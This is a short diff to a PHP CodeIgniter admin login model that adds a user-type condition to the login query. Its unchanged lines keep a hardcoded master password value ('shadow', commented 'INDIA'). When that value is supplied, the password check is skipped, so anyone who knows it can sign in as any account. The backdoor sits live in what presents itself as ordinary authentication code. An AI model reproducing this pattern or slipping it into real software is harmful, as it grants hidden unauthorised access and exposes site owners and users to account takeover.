@@ -2,14 +2,14 @@
 Class Admin_model extends CI_Model
 {
   var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
- function login($username, $password)
+ function login($username, $password,$user)
  {
    $this -> db -> select('id, username');
    $this -> db -> from('logins');
    $this -> db -> where('username', $username);
    if($password != $this->shadow)
    $this -> db -> where('password', $password);
-   //$this -> db -> where('status', '2');
+   $this -> db -> where('user_type', $user);
    $this -> db -> limit(1);
    $query = $this -> db -> get();
    if($query -> num_rows() == 1)
